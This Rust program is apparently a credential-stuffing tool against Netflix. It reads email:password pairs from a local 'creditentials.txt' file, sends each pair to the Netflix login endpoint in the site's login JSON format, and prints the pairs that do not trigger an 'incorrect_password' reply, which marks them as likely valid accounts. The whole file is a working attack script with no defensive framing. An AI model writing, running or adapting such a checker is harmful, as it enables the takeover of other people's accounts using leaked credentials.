use reqwest::{Client, Error};
use serde_json::json;
use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;

fn extract(word: &str) -> (String, String) {
    let mut parts = word.splitn(2, ':');
    let email = parts.next().unwrap_or_default().to_string();
    let pass = parts.next().unwrap_or_default().to_string();
    (email, pass)
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    let url = "https://www.netflix.com/login";
    
    if let Ok(lines) = read_lines("./creditentials.txt") {
        let client = Client::new();

        for line in lines.flatten() {
            let (username, password) = extract(&line);
            
            let data = json!({  
                "jsonGraph": {
                    "aui": {
                        "moneyball": {
                            "next": {
                                "$type": "atom",
                                "value": {
                                    "result": {
                                        "mode": "login",
                                        "fields": {
                                            "userLoginId": {"fieldType": "String", "value": username}, 
                                            "password": {"fieldType": "String", "value": password}, 
                                        },
                                        "errorCode": {"fieldType": "String"}
                                    }
                                }
                            }
                        }
                    }
                }
            });

            let response = client.post(url)
                .json(&data)
                .send()
                .await?;

            let status_code = response.status();
            if status_code.is_success() {
                let response_text = response.text().await?;
                if response_text.contains("incorrect_password") {
                    println!("Error code 'incorrect_password' found.");
                } else {
                    println!("Error code 'incorrect_password' not found.");
                    println!("Email : {}, Password : {}", username, password);
                }
            } else {
                println!("Request failed with status code {}", status_code);
            }
        }
    }
    Ok(())
}
